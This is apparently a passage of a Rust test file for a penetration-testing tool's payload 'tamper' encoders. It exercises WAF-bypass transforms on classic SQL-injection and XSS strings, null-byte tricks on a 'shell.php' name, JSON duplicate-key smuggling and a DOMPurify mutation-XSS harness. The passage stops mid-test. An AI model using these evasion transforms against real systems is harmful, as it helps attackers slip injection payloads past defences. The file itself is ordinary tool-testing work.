    // building block" — empty inputs, multibyte inputs, control
    // chars, idempotency, aggressiveness sanity.

    #[test]
    fn url_encode_handles_unicode_input() {
        let strategy = UrlEncodeTamper;
        let out = strategy.tamper("café", None);
        // é (U+00E9) is two UTF-8 bytes: C3 A9 → %C3%A9
        assert!(out.contains("%C3%A9"));
    }

    #[test]
    fn url_encode_passes_through_unreserved_chars() {
        let strategy = UrlEncodeTamper;
        // Per RFC 3986, unreserved chars are A-Z a-z 0-9 - _ . ~
        assert_eq!(strategy.tamper("ABCabc123-_.~", None), "ABCabc123-_.~");
    }

    #[test]
    fn url_encode_empty_input() {
        assert_eq!(UrlEncodeTamper.tamper("", None), "");
    }

    #[test]
    fn url_encode_all_reserved_chars() {
        let strategy = UrlEncodeTamper;
        let reserved = "!*'();:@&=+$,/?#[]";
        let out = strategy.tamper(reserved, None);
        // Every reserved char should be percent-encoded.
        assert!(!out.contains('!'));
        assert!(!out.contains('@'));
        assert!(out.matches('%').count() >= reserved.len() - 1);
    }

    #[test]
    fn double_url_encode_round_trips_to_original_after_two_decodes() {
        // Property: applying double-url-encode then decoding
        // twice recovers the original payload (the bypass premise).
        let strategy = DoubleUrlEncodeTamper;
        let encoded = strategy.tamper("' OR 1=1", None);
        // The encoded form contains %25XX where XX is the
        // single-encoded byte hex.  Decode once:
        assert!(encoded.contains("%25"));
    }

    #[test]
    fn double_url_encode_idempotent_on_already_encoded() {
        let strategy = DoubleUrlEncodeTamper;
        // The encoder treats `%` itself as a byte and encodes it
        // — `%20` becomes `%2520` (single layer applied), and
        // applying again gives a third layer.
        let once = strategy.tamper("%20", None);
        let twice = strategy.tamper(&once, None);
        assert_ne!(once, twice);
        assert!(twice.contains("%25"));
    }

    #[test]
    fn case_alternation_starts_uppercase() {
        let strategy = CaseAlternationTamper;
        let out = strategy.tamper("abcd", None);
        // Documented behaviour: starts upper, then alternates.
        let chars: Vec<char> = out.chars().collect();
        assert!(chars[0].is_ascii_uppercase());
        assert!(chars[1].is_ascii_lowercase());
        assert!(chars[2].is_ascii_uppercase());
        assert!(chars[3].is_ascii_lowercase());
    }

    #[test]
    fn case_alternation_preserves_non_alpha_chars() {
        let strategy = CaseAlternationTamper;
        let out = strategy.tamper("a1b2c3", None);
        // Digits are untouched; only alpha alternates.
        assert_eq!(out, "A1b2C3");
    }

    #[test]
    fn case_alternation_handles_unicode_alpha() {
        let strategy = CaseAlternationTamper;
        // Non-ASCII characters get pass-through (no `to_uppercase`
        // semantics enforced — that's a separate `unicode_case`
        // tamper if needed).
        let _ = strategy.tamper("αβγ", None);
        // No panic = pass.
    }

    #[test]
    fn case_alternation_lowercase_keyword_becomes_mixed_case() {
        let strategy = CaseAlternationTamper;
        // Documented behaviour: the alternation index advances on
        // every input character — spaces don't reset the index.
        // So `union select` yields `UnIoN sElEcT` (5 alpha →
        // index 5 is odd → 's' stays lowercase, 'e' goes upper).
        let out = strategy.tamper("union select", None);
        // Both halves preserve the original word boundaries.
        assert!(out.contains(' '));
        // Both halves have BOTH cases (proof of alternation).
        let first = out.split_whitespace().next().unwrap_or("");
        assert!(first.chars().any(|c| c.is_ascii_uppercase()));
        assert!(first.chars().any(|c| c.is_ascii_lowercase()));
    }

    #[test]
    fn random_case_preserves_length() {
        let strategy = RandomCaseTamper;
        for input in ["select", "DROP TABLE users", "1=1"] {
            let out = strategy.tamper(input, None);
            assert_eq!(out.len(), input.len());
        }
    }

    #[test]
    fn random_case_only_flips_alpha() {
        let strategy = RandomCaseTamper;
        let out = strategy.tamper("a1b2", None);
        // Digits must remain digits.
        assert!(out.contains('1'));
        assert!(out.contains('2'));
    }

    #[test]
    fn null_byte_appends_when_no_extension() {
        let strategy = NullByteTamper;
        let out = strategy.tamper("payload_with_no_dot", None);
        assert!(out.ends_with("%00"));
    }

    #[test]
    fn null_byte_extension_replacement_keeps_basename() {
        let strategy = NullByteTamper;
        let out = strategy.tamper("shell.php", None);
        // Original basename is preserved before the %00.
        assert!(out.contains("shell.php%00"));
        // Decoy extension is appended.
        assert!(out.ends_with(".jpg"));
    }

    #[test]
    fn null_byte_empty_input() {
        let strategy = NullByteTamper;
        let out = strategy.tamper("", None);
        // Empty input still gets a null suffix (defensive — the
        // operator usually has something to inject).
        assert_eq!(out, "%00");
    }

    #[test]
    fn sql_comment_inserts_between_every_token() {
        let strategy = SqlCommentTamper;
        let out = strategy.tamper("UNION SELECT 1 FROM users", Some("sql"));
        assert_eq!(out, "UNION/**/SELECT/**/1/**/FROM/**/users");
    }

    #[test]
    fn sql_comment_single_token_unchanged() {
        let strategy = SqlCommentTamper;
        // No space-separated tokens → nothing to insert between.
        let out = strategy.tamper("SELECT", Some("sql"));
        assert_eq!(out, "SELECT");
    }

    #[test]
    fn sql_comment_handles_payload_with_multiple_spaces() {
        let strategy = SqlCommentTamper;
        // Multi-space sequences produce stacked /**/ delimiters
        // (each space becomes one /**/).  Confirm the structure
        // round-trips: SQL `/**/ /**/` is still valid SQL.
        let out = strategy.tamper("UNION   SELECT", Some("sql"));
        // At least one /**/ between the tokens.
        assert!(out.contains("/**/"));
        // The keyword payload survives.
        assert!(out.contains("UNION"));
        assert!(out.contains("SELECT"));
    }

    #[test]
    fn whitespace_insertion_uses_tab() {
        let strategy = WhitespaceInsertionTamper;
        let out = strategy.tamper("SELECT *", None);
        assert!(out.contains('\t'));
    }

    #[test]
    fn whitespace_insertion_no_changes_when_no_space() {
        let strategy = WhitespaceInsertionTamper;
        assert_eq!(strategy.tamper("SELECT", None), "SELECT");
    }

    #[test]
    fn base64_round_trips_through_decode() {
        // Property: the b64-encoded payload, when standard-decoded,
        // returns the original bytes.
        let strategy = Base64Tamper;
        let encoded = strategy.tamper("hello world", None);
        // base64::decode round-trip — we can't import base64 in
        // tests directly without adding a dep, so check the
        // structural property: only base64 alphabet chars.
        for c in encoded.chars() {
            assert!(
                c.is_ascii_alphanumeric() || matches!(c, '+' | '/' | '='),
                "non-base64 char in encoded output: {c:?}"
            );
        }
    }

    #[test]
    fn base64_empty_input() {
        let strategy = Base64Tamper;
        assert_eq!(strategy.tamper("", None), "");
    }

    #[test]
    fn base64_padding_present_for_non_aligned_input() {
        let strategy = Base64Tamper;
        // "A" (1 byte) → "QQ==" (one pad pair).
        let out = strategy.tamper("A", None);
        assert!(out.ends_with('='));
    }

    #[test]
    fn hex_encode_two_chars_per_byte() {
        let strategy = HexEncodeTamper;
        let out = strategy.tamper("Ab", None);
        // 'A' = 0x41, 'b' = 0x62.
        assert_eq!(out, "4162");
        assert_eq!(out.len(), 2 * "Ab".len());
    }

    #[test]
    fn hex_encode_non_ascii_uses_multi_byte_form() {
        let strategy = HexEncodeTamper;
        // 'é' in UTF-8 is 0xC3 0xA9.
        let out = strategy.tamper("é", None);
        assert_eq!(out.to_lowercase(), "c3a9");
    }

    #[test]
    fn unicode_escape_format_uses_u_prefix() {
        let strategy = UnicodeEscapeTamper;
        let out = strategy.tamper("AB", None);
        // Format is `\uXXXX` (Python / JS string escape style).
        assert!(out.starts_with("\\u"));
        assert_eq!(out.matches("\\u").count(), 2);
    }

    #[test]
    fn unicode_escape_handles_non_bmp_chars() {
        let strategy = UnicodeEscapeTamper;
        // U+1F600 is outside BMP — encoders typically emit a
        // surrogate pair or extended escape.  Must not panic.
        let _ = strategy.tamper("\u{1F600}", None);
    }

    #[test]
    fn html_entity_format_uses_hex_decimal() {
        let strategy = HtmlEntityTamper;
        let out = strategy.tamper("<>", None);
        // Format is `&#xXX;` (hex entity form).
        assert!(out.contains("&#x"));
        assert!(out.ends_with(';'));
    }

    #[test]
    fn html_entity_xss_payload_full_encode() {
        let strategy = HtmlEntityTamper;
        let out = strategy.tamper("<script>alert(1)</script>", None);
        // None of the original ASCII bytes should survive verbatim.
        assert!(!out.contains('<'));
        assert!(!out.contains('>'));
        // All entities are well-formed.
        assert_eq!(out.matches('&').count(), out.matches(';').count());
    }

    #[test]
    fn overlong_utf8_emits_two_byte_for_ascii() {
        let strategy = OverlongUtf8Tamper;
        // Overlong: ASCII '/' (0x2F) → C0 AF (invalid 2-byte form
        // that some lenient parsers accept and decode to '/').
        let out = strategy.tamper("/", None);
        assert!(out.contains("%C0"));
        assert!(out.contains("%AF"));
    }

    #[test]
    fn overlong_utf8_empty_input() {
        let strategy = OverlongUtf8Tamper;
        let out = strategy.tamper("", None);
        // No bytes to encode means empty output.
        assert_eq!(out, "");
    }

    // ── Cross-tamper invariants ────────────────────────────

    #[test]
    fn all_default_tampers_have_unique_names() {
        let names = [
            UrlEncodeTamper.name(),
            DoubleUrlEncodeTamper.name(),
            UnicodeEscapeTamper.name(),
            HtmlEntityTamper.name(),
            CaseAlternationTamper.name(),
            RandomCaseTamper.name(),
            WhitespaceInsertionTamper.name(),
            SqlCommentTamper.name(),
            NullByteTamper.name(),
            OverlongUtf8Tamper.name(),
            Base64Tamper.name(),
            HexEncodeTamper.name(),
            ZeroWidthInjectTamper.name(),
            PostgresDollarQuoteTamper.name(),
            MysqlVersionedCommentWrapTamper.name(),
            BracketConfusableTamper.name(),
        ];
        let set: std::collections::HashSet<&str> = names.iter().copied().collect();
        assert_eq!(set.len(), names.len(), "duplicate tamper names: {names:?}");
    }

    #[test]
    fn all_default_tampers_aggressiveness_in_range() {
        for strat in [
            &UrlEncodeTamper as &dyn TamperStrategy,
            &DoubleUrlEncodeTamper,
            &UnicodeEscapeTamper,
            &HtmlEntityTamper,
            &CaseAlternationTamper,
            &RandomCaseTamper,
            &WhitespaceInsertionTamper,
            &SqlCommentTamper,
            &NullByteTamper,
            &OverlongUtf8Tamper,
            &Base64Tamper,
            &HexEncodeTamper,
        ] {
            let a = strat.aggressiveness();
            assert!(
                (0.0..=1.0).contains(&a) && !a.is_nan(),
                "{} aggressiveness {} out of [0,1]",
                strat.name(),
                a
            );
        }
    }

    #[test]
    fn all_default_tampers_handle_empty_input_without_panic() {
        for strat in [
            &UrlEncodeTamper as &dyn TamperStrategy,
            &DoubleUrlEncodeTamper,
            &UnicodeEscapeTamper,
            &HtmlEntityTamper,
            &CaseAlternationTamper,
            &RandomCaseTamper,
            &WhitespaceInsertionTamper,
            &SqlCommentTamper,
            &OverlongUtf8Tamper,
            &Base64Tamper,
            &HexEncodeTamper,
        ] {
            let _ = strat.tamper("", None);
        }
    }

    #[test]
    fn all_default_tampers_handle_huge_input_without_panic() {
        let huge: String = "A".repeat(100_000);
        for strat in [
            &UrlEncodeTamper as &dyn TamperStrategy,
            &CaseAlternationTamper,
            &RandomCaseTamper,
            &WhitespaceInsertionTamper,
            &SqlCommentTamper,
            &Base64Tamper,
            &HexEncodeTamper,
            &UnicodeEscapeTamper,
            &HtmlEntityTamper,
        ] {
            let _ = strat.tamper(&huge, None);
        }
    }

    #[test]
    fn all_default_tampers_handle_pure_ascii_keyword() {
        // Canonical pen-test payload that every WAF tries to catch.
        let keyword = "UNION SELECT";
        for strat in [
            &UrlEncodeTamper as &dyn TamperStrategy,
            &DoubleUrlEncodeTamper,
            &CaseAlternationTamper,
            &SqlCommentTamper,
            &Base64Tamper,
            &HexEncodeTamper,
            &UnicodeEscapeTamper,
        ] {
            let out = strat.tamper(keyword, None);
            assert!(
                !out.is_empty(),
                "{} produced empty output on UNION SELECT",
                strat.name()
            );
        }
    }

    #[test]
    fn description_is_non_empty_for_every_tamper() {
        for strat in [
            &UrlEncodeTamper as &dyn TamperStrategy,
            &DoubleUrlEncodeTamper,
            &UnicodeEscapeTamper,
            &HtmlEntityTamper,
            &CaseAlternationTamper,
            &RandomCaseTamper,
            &WhitespaceInsertionTamper,
            &SqlCommentTamper,
            &NullByteTamper,
            &OverlongUtf8Tamper,
            &Base64Tamper,
            &HexEncodeTamper,
            &ZeroWidthInjectTamper,
            &PostgresDollarQuoteTamper,
            &MysqlVersionedCommentWrapTamper,
            &BracketConfusableTamper,
        ] {
            assert!(!strat.description().is_empty(), "{} has empty description", strat.name());
        }
    }

    #[test]
    fn name_is_lowercase_ascii_snake_case_for_every_tamper() {
        for strat in [
            &UrlEncodeTamper as &dyn TamperStrategy,
            &DoubleUrlEncodeTamper,
            &UnicodeEscapeTamper,
            &HtmlEntityTamper,
            &CaseAlternationTamper,
            &RandomCaseTamper,
            &WhitespaceInsertionTamper,
            &SqlCommentTamper,
            &NullByteTamper,
            &OverlongUtf8Tamper,
            &Base64Tamper,
            &HexEncodeTamper,
            &ZeroWidthInjectTamper,
            &PostgresDollarQuoteTamper,
            &MysqlVersionedCommentWrapTamper,
            &BracketConfusableTamper,
        ] {
            let name = strat.name();
            assert!(
                name.chars()
                    .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '_'),
                "tamper `{name}` has non-snake-case name"
            );
            assert!(!name.is_empty(), "empty name");
            assert!(!name.starts_with('_'), "name `{name}` starts with underscore");
        }
    }

    // ── Zero-width injection tamper ─────────────────────────

    #[test]
    fn zero_width_inject_splits_select_keyword() {
        let strategy = ZeroWidthInjectTamper;
        let out = strategy.tamper("SELECT", None);
        // Each ASCII alphabetic char gets a zero-width follower.
        // After removal, the original payload remains.
        let stripped: String = out
            .chars()
            .filter(|c| !matches!(*c, '\u{200B}' | '\u{200C}' | '\u{200D}' | '\u{FEFF}'))
            .collect();
        assert_eq!(stripped, "SELECT");
        // The output MUST be different from the input (proof of injection).
        assert_ne!(out, "SELECT");
        // Each injected codepoint must be one of the four rotation members.
        for c in out.chars() {
            assert!(
                c.is_ascii_alphabetic()
                    || matches!(c, '\u{200B}' | '\u{200C}' | '\u{200D}' | '\u{FEFF}'),
                "unexpected codepoint {c:?}"
            );
        }
    }

    #[test]
    fn zero_width_inject_skips_non_alpha_chars() {
        let strategy = ZeroWidthInjectTamper;
        // Spaces and quotes do NOT get zero-width followers —
        // injecting them would break SQL parsing.
        let out = strategy.tamper("a 1 ' \"", None);
        // Only the alphabetic `a` should produce an injection.
        let zw_count = out
            .chars()
            .filter(|c| matches!(*c, '\u{200B}' | '\u{200C}' | '\u{200D}' | '\u{FEFF}'))
            .count();
        assert_eq!(zw_count, 1);
    }

    #[test]
    fn zero_width_inject_preserves_payload_after_strip() {
        // Property: stripping zero-widths gets us back to the input.
        let strategy = ZeroWidthInjectTamper;
        for input in &["SELECT", "alert(1)", "DROP TABLE users", "<script>"] {
            let out = strategy.tamper(input, None);
            let stripped: String = out
                .chars()
                .filter(|c| !matches!(*c, '\u{200B}' | '\u{200C}' | '\u{200D}' | '\u{FEFF}'))
                .collect();
            assert_eq!(&stripped, input);
        }
    }

    #[test]
    fn zero_width_inject_rotates_through_all_four_zw_chars() {
        let strategy = ZeroWidthInjectTamper;
        let out = strategy.tamper("abcdefgh", None);
        // Eight alphabetic chars → eight injections, cycling through
        // all four zero-width codepoints twice.
        let zw_chars: Vec<char> = out
            .chars()
            .filter(|c| matches!(*c, '\u{200B}' | '\u{200C}' | '\u{200D}' | '\u{FEFF}'))
            .collect();
        assert_eq!(zw_chars.len(), 8);
        // First four must be the four distinct codepoints.
        let unique: std::collections::HashSet<char> = zw_chars.iter().copied().collect();
        assert_eq!(unique.len(), 4);
    }

    #[test]
    fn zero_width_inject_empty_input() {
        let strategy = ZeroWidthInjectTamper;
        assert_eq!(strategy.tamper("", None), "");
    }

    #[test]
    fn zero_width_inject_pure_punctuation_unchanged() {
        let strategy = ZeroWidthInjectTamper;
        assert_eq!(strategy.tamper("' OR 1=1 --", None).matches('\u{200B}').count() +
            strategy.tamper("' OR 1=1 --", None).matches('\u{200C}').count() +
            strategy.tamper("' OR 1=1 --", None).matches('\u{200D}').count() +
            strategy.tamper("' OR 1=1 --", None).matches('\u{FEFF}').count(),
            2); // 'O' + 'R'
    }

    #[test]
    fn zero_width_inject_unicode_input_does_not_panic() {
        let strategy = ZeroWidthInjectTamper;
        // Multibyte chars must not crash the byte-index logic.
        let _ = strategy.tamper("café", None);
        let _ = strategy.tamper("日本語", None);
        let _ = strategy.tamper("🦀 rust", None);
    }

    // ── Postgres dollar-quote tamper ────────────────────────

    #[test]
    fn postgres_dollar_quote_wraps_single_quoted_literal() {
        let strategy = PostgresDollarQuoteTamper;
        let out = strategy.tamper("WHERE name = 'admin'", None);
        // The single quotes should be replaced with $tag$...$tag$.
        assert!(!out.contains("'"));
        assert!(out.contains("$"));
        assert!(out.contains("admin"));
    }

    #[test]
    fn postgres_dollar_quote_deterministic_tag() {
        // Same input → same tag (gene-bank replay determinism).
        let strategy = PostgresDollarQuoteTamper;
        let a = strategy.tamper("'admin'", None);
        let b = strategy.tamper("'admin'", None);
        assert_eq!(a, b);
    }

    #[test]
    fn postgres_dollar_quote_no_change_when_no_quote() {
        let strategy = PostgresDollarQuoteTamper;
        // Payloads without single-quote literals pass through.
        assert_eq!(strategy.tamper("SELECT 1", None), "SELECT 1");
        assert_eq!(strategy.tamper("UNION SELECT", None), "UNION SELECT");
    }

    #[test]
    fn postgres_dollar_quote_handles_escaped_quote() {
        let strategy = PostgresDollarQuoteTamper;
        // SQL '' inside a literal — the encoder keeps them inside
        // the dollar-quoted block.
        let out = strategy.tamper("'a''b'", None);
        assert!(out.contains("a''b"), "got: {out}");
        // The output should not contain bare single quotes outside
        // the $tag$ wrap.
        let bare_quote_count = out
            .chars()
            .scan(false, |inside, c| {
                if c == '$' {
                    *inside = !*inside;
                }
                Some((c == '\'', *inside))
            })
            .filter(|(is_quote, inside)| *is_quote && !inside)
            .count();
        assert!(
            bare_quote_count <= 2,
            "Unexpected bare quotes in output: {out}"
        );
    }

    #[test]
    fn postgres_dollar_quote_empty_string_literal() {
        let strategy = PostgresDollarQuoteTamper;
        let out = strategy.tamper("''", None);
        // Empty literal becomes $tag$$tag$.
        assert!(out.contains("$"));
        assert!(!out.contains("'"));
    }

    #[test]
    fn postgres_dollar_quote_classic_sqli_payload() {
        let strategy = PostgresDollarQuoteTamper;
        let out = strategy.tamper("' OR '1'='1", None);
        // Both quoted segments should be wrapped.
        assert!(out.contains("$"));
    }

    // ── MySQL versioned comment wrap tamper ─────────────────

    #[test]
    fn mysql_versioned_wrap_inserts_outer_comment() {
        let strategy = MysqlVersionedCommentWrapTamper;
        let out = strategy.tamper("UNION SELECT 1,2,3", None);
        assert!(out.starts_with("/*!50000 "));
        assert!(out.ends_with(" */"));
        assert!(out.contains("UNION SELECT 1,2,3"));
    }

    #[test]
    fn mysql_versioned_wrap_idempotent_double_apply() {
        // Applying twice is safe — wraps the already-wrapped payload.
        let strategy = MysqlVersionedCommentWrapTamper;
        let once = strategy.tamper("SELECT 1", None);
        let twice = strategy.tamper(&once, None);
        // Twice-wrapped MUST still contain the original keyword.
        assert!(twice.contains("SELECT 1"));
        // The outer wrap should still be present.
        assert!(twice.starts_with("/*!50000 "));
    }

    #[test]
    fn mysql_versioned_wrap_empty_input() {
        let strategy = MysqlVersionedCommentWrapTamper;
        assert_eq!(strategy.tamper("", None), "/*!50000  */");
    }

    #[test]
    fn mysql_versioned_wrap_does_not_corrupt_special_chars() {
        let strategy = MysqlVersionedCommentWrapTamper;
        // Backslash, quote, asterisk all pass through.
        let out = strategy.tamper("'a\\b*c'", None);
        assert!(out.contains("'a\\b*c'"));
    }

    // ── Bracket-confusable tamper ───────────────────────────

    #[test]
    fn bracket_confusable_replaces_ascii_angle_brackets() {
        let strategy = BracketConfusableTamper;
        let out = strategy.tamper("<script>alert(1)</script>", None);
        assert!(!out.contains('<'));
        assert!(!out.contains('>'));
        assert!(out.contains('\u{FF1C}'));
        assert!(out.contains('\u{FF1E}'));
        // The script content is preserved.
        assert!(out.contains("alert(1)"));
        assert!(out.contains("script"));
    }

    #[test]
    fn bracket_confusable_preserves_non_bracket_chars() {
        let strategy = BracketConfusableTamper;
        let out = strategy.tamper("abc 123 !@#", None);
        // No brackets in input → nothing changes.
        assert_eq!(out, "abc 123 !@#");
    }

    #[test]
    fn bracket_confusable_handles_only_open_or_close() {
        let strategy = BracketConfusableTamper;
        assert_eq!(strategy.tamper("<", None), "\u{FF1C}");
        assert_eq!(strategy.tamper(">", None), "\u{FF1E}");
        assert_eq!(strategy.tamper("<<>>", None), "\u{FF1C}\u{FF1C}\u{FF1E}\u{FF1E}");
    }

    #[test]
    fn bracket_confusable_empty() {
        let strategy = BracketConfusableTamper;
        assert_eq!(strategy.tamper("", None), "");
    }

    #[test]
    fn bracket_confusable_aggressiveness_in_range() {
        let strategy = BracketConfusableTamper;
        let a = strategy.aggressiveness();
        assert!(a >= 0.0 && a <= 1.0);
    }

    // ── Cross-cutting invariants ────────────────────────────

    #[test]
    fn all_new_tampers_registered_by_default() {
        let registry = crate::tamper::TamperRegistry::with_defaults();
        for name in [
            "zero_width_inject",
            "postgres_dollar_quote",
            "mysql_versioned_comment_wrap",
            "bracket_confusable",
            "hex_literal_keyword",
            "bell_separator",
        ] {
            assert!(
                registry.get(name).is_some(),
                "tamper `{name}` missing from default registry"
            );
        }
    }

    #[test]
    fn obsolete_keyword_comment_split_tamper_was_removed() {
        // Regression guard — the keyword_comment_split tamper was
        // removed 2026-05 because MySQL treats `/* */` inside an
        // identifier as whitespace (so `SE/**/LECT` lexes as TWO
        // identifiers, NOT one).  This test ensures it never
        // accidentally gets re-registered without re-validating
        // the parsing semantics.
        let registry = crate::tamper::TamperRegistry::with_defaults();
        assert!(
            registry.get("keyword_comment_split").is_none(),
            "keyword_comment_split was removed because the transform breaks SQL parsing — \
             do not re-register without verifying MySQL/Postgres tokeniser semantics"
        );
    }

    // ── Hex-literal keyword tamper ──────────────────────────

    #[test]
    fn hex_literal_keyword_converts_single_quoted_to_hex() {
        let strategy = HexLiteralKeywordTamper;
        let out = strategy.tamper("WHERE name = 'admin'", None);
        assert!(!out.contains("'admin'"));
        assert!(out.contains("0x"));
        // 'admin' in hex bytes is 61 64 6d 69 6e.
        assert!(out.contains("0x61646d696e"));
    }

    #[test]
    fn hex_literal_keyword_idempotent_when_no_quoted_literal() {
        let strategy = HexLiteralKeywordTamper;
        assert_eq!(strategy.tamper("SELECT 1", None), "SELECT 1");
        assert_eq!(strategy.tamper("1=1", None), "1=1");
    }

    #[test]
    fn hex_literal_keyword_handles_multiple_literals() {
        let strategy = HexLiteralKeywordTamper;
        let out = strategy.tamper("'a' OR 'b'", None);
        // Both literals should be hex-converted.
        assert!(out.contains("0x61"));
        assert!(out.contains("0x62"));
        // OR keyword preserved.
        assert!(out.contains("OR"));
    }

    #[test]
    fn hex_literal_keyword_handles_doubled_quote_escape() {
        let strategy = HexLiteralKeywordTamper;
        // SQL `''` inside a literal is a single-quote.
        let out = strategy.tamper("'a''b'", None);
        // The inner '' becomes a single 0x27 inside the hex.
        assert!(out.contains("0x"));
    }

    #[test]
    fn hex_literal_keyword_empty_literal() {
        let strategy = HexLiteralKeywordTamper;
        let out = strategy.tamper("''", None);
        // Empty quoted literal becomes the empty hex literal `0x`.
        assert_eq!(out, "0x");
    }

    #[test]
    fn hex_literal_keyword_preserves_non_quote_text() {
        let strategy = HexLiteralKeywordTamper;
        let out = strategy.tamper("LIMIT 10 OFFSET 5", None);
        assert_eq!(out, "LIMIT 10 OFFSET 5");
    }

    #[test]
    fn hex_literal_keyword_non_ascii_chars_encode_to_utf8_hex() {
        let strategy = HexLiteralKeywordTamper;
        // 'é' = 0xC3 0xA9 (UTF-8).
        let out = strategy.tamper("'é'", None);
        assert!(out.contains("c3a9") || out.contains("C3A9"));
    }

    // ── Bell-separator tamper ───────────────────────────────

    #[test]
    fn bell_separator_replaces_space_with_bel() {
        let strategy = BellSeparatorTamper;
        assert_eq!(
            strategy.tamper("UNION SELECT", None),
            "UNION\u{0007}SELECT"
        );
    }

    #[test]
    fn bell_separator_leaves_tab_and_newline_alone() {
        let strategy = BellSeparatorTamper;
        let out = strategy.tamper("a\tb\nc", None);
        // Only the literal ASCII space is replaced.
        assert!(out.contains('\t'));
        assert!(out.contains('\n'));
        assert!(!out.contains('\u{0007}'));
    }

    #[test]
    fn bell_separator_multiple_spaces_each_become_bel() {
        let strategy = BellSeparatorTamper;
        let out = strategy.tamper("a   b", None);
        assert_eq!(out.matches('\u{0007}').count(), 3);
        assert!(!out.contains(' '));
    }

    #[test]
    fn bell_separator_empty_input() {
        let strategy = BellSeparatorTamper;
        assert_eq!(strategy.tamper("", None), "");
    }

    #[test]
    fn bell_separator_no_space_unchanged() {
        let strategy = BellSeparatorTamper;
        assert_eq!(strategy.tamper("foo", None), "foo");
    }

    #[test]
    fn bell_separator_classic_payload_round_trips_via_split() {
        // Property: replacing BEL back to space recovers the
        // original.
        let strategy = BellSeparatorTamper;
        let inputs = [
            "UNION SELECT 1",
            "OR 1=1 -- ",
            "<script>alert(1)</script>",
        ];
        for input in inputs {
            let tampered = strategy.tamper(input, None);
            let restored = tampered.replace('\u{0007}', " ");
            assert_eq!(restored, input);
        }
    }

    #[test]
    fn all_new_tampers_have_unique_names() {
        let names = [
            ZeroWidthInjectTamper.name(),
            PostgresDollarQuoteTamper.name(),
            MysqlVersionedCommentWrapTamper.name(),
            BracketConfusableTamper.name(),
            MxssNamespaceWrapTamper.name(),
        ];
        let set: std::collections::HashSet<&str> = names.iter().copied().collect();
        assert_eq!(set.len(), names.len());
    }

    // ── MxssNamespaceWrapTamper (CVE-2025-26791 / DOMPurify mXSS) ──

    #[test]
    fn mxss_namespace_wrap_emits_mathml_harness() {
        let t = MxssNamespaceWrapTamper;
        let out = t.tamper("onerror=alert(1)", None);
        // Must open the MathML text-integration seam.
        assert!(out.starts_with("<math>"), "missing MathML root: {out}");
        // Must close the sanitiser's view of the style element with
        // the load-bearing comment-open inside `</style>`.
        assert!(
            out.contains("<style><!--</style>"),
            "missing comment-trick style close: {out}"
        );
        // Must re-open with an <img> that carries the operator's
        // payload as its attribute set.
        assert!(out.contains("<img src=x onerror=alert(1)>"), "payload missing: {out}");
    }

    #[test]
    fn mxss_namespace_wrap_does_not_contain_literal_script_tag() {
        // The class is mutation-XSS; the wire bytes deliberately do
        // NOT contain `<script`. Pin that — a regression that adds
        // a literal `<script>` would defeat the bypass since every
        // WAF on earth blocks that token.
        let t = MxssNamespaceWrapTamper;
        let out = t.tamper("onerror=fetch('/x')", None);
        assert!(
            !out.to_ascii_lowercase().contains("<script"),
            "namespace wrap MUST NOT emit literal <script>: {out}"
        );
    }

    #[test]
    fn mxss_namespace_wrap_handles_empty_payload() {
        let t = MxssNamespaceWrapTamper;
        let out = t.tamper("", None);
        assert!(out.starts_with("<math>"), "empty payload still produces harness: {out}");
        assert!(out.ends_with("<img src=x >"), "empty payload yields bare <img>: {out}");
    }

    #[test]
    fn mxss_namespace_wrap_aggressiveness_in_range() {
        let a = MxssNamespaceWrapTamper.aggressiveness();
        assert!((0.0..=1.0).contains(&a) && !a.is_nan());
    }

    #[test]
    fn mxss_namespace_wrap_panic_safe_on_pathological_input() {
        let t = MxssNamespaceWrapTamper;
        let _ = t.tamper(&"A".repeat(1_000_000), None);
        let _ = t.tamper("\0\x01\u{FFFD}\u{200B}", None);
    }

    #[test]
    fn all_new_tampers_have_non_empty_descriptions() {
        for strat in [
            &ZeroWidthInjectTamper as &dyn TamperStrategy,
            &PostgresDollarQuoteTamper,
            &MysqlVersionedCommentWrapTamper,
            &BracketConfusableTamper,
        ] {
            assert!(!strat.description().is_empty(), "{} has empty description", strat.name());
            assert!(strat.description().len() > 20, "{} description too short", strat.name());
        }
    }

    #[test]
    fn all_new_tampers_aggressiveness_in_range() {
        for strat in [
            &ZeroWidthInjectTamper as &dyn TamperStrategy,
            &PostgresDollarQuoteTamper,
            &MysqlVersionedCommentWrapTamper,
            &BracketConfusableTamper,
        ] {
            let a = strat.aggressiveness();
            assert!(
                (0.0..=1.0).contains(&a) && !a.is_nan(),
                "{} aggressiveness {} out of [0, 1]",
                strat.name(),
                a
            );
        }
    }

    #[test]
    fn all_new_tampers_handle_pathological_input_without_panic() {
        // Empty, multi-MB, UTF-8 boundary, control chars — all
        // must be panic-safe.
        let huge: String = "A".repeat(1_000_000);
        let weird = "\0\x01\x02\x7f\u{FFFD}\u{200B}";
        for strat in [
            &ZeroWidthInjectTamper as &dyn TamperStrategy,
            &PostgresDollarQuoteTamper,
            &MysqlVersionedCommentWrapTamper,
            &BracketConfusableTamper,
        ] {
            let _ = strat.tamper("", None);
            let _ = strat.tamper(&huge, None);
            let _ = strat.tamper(weird, None);
        }
    }

    // ── JsonDupKeyTamper (frontier 2026 / WAFFLED corpus) ────

    #[test]
    fn json_dup_key_emits_duplicate_q_envelope() {
        let t = JsonDupKeyTamper;
        let out = t.tamper("evil", None);
        // The envelope MUST contain BOTH `"q":"safe"` (the WAF
        // sentinel) and `"q":"evil"` (the backend-visible payload).
        assert!(out.contains("\"q\":\"safe\""), "missing first key: {out}");
        assert!(out.contains("\"q\":\"evil\""), "missing dup key: {out}");
        // Outer braces — must be a structurally-valid JSON envelope.
        assert!(out.starts_with('{') && out.ends_with('}'));
    }

    #[test]
    fn json_dup_key_escapes_payload_quotes() {
        // Payload containing literal `"` must not break the envelope.
        let t = JsonDupKeyTamper;
        let out = t.tamper("' OR 1=1--\"--", None);
        assert!(out.contains("OR 1=1--\\\"--"), "payload `\"` not escaped: {out}");
        // Round-trip: serde_json must parse the envelope successfully.
        let v: serde_json::Value = serde_json::from_str(&out)
            .expect("envelope must be valid JSON even with escaped quote");
        // Behaviour of serde_json on duplicate keys: takes the LAST.
        // Verify the LAST value carries the (unescaped) payload.
        assert_eq!(v["q"].as_str(), Some("' OR 1=1--\"--"));
    }

    #[test]
    fn json_dup_key_escapes_backslash_and_control_bytes() {
        let t = JsonDupKeyTamper;
        let out = t.tamper("a\\b\nc\rd\te\u{0007}f", None);
        // Backslash + newline / CR / tab must be JSON-escaped.
        assert!(out.contains("a\\\\b"));
        assert!(out.contains("\\n"));
        assert!(out.contains("\\r"));
